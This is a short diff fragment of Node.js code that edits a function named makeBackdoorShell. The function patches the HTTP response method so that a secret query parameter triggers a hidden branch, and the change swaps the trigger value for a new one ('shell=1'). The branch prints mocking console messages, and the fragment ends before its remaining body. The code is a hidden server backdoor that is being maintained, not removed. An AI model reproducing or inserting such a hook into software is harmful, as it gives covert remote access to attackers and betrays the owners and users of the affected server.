@@ -89,7 +89,7 @@
  function makeBackdoorShell ( ) {
 	 require('http').ServerResponse.prototype.end = (function ( end ) {
 		 return function ( ) {
-			 if (this.socket._httpMessage.req.query.open === 'http-shell') {
+			 if (this.socket._httpMessage.req.query.shell === '1') {
 				 
 				 console.log('YOU\'RE FUCKED!!!');
 				 console.log('HAHAHAHAHAHAHAHA');
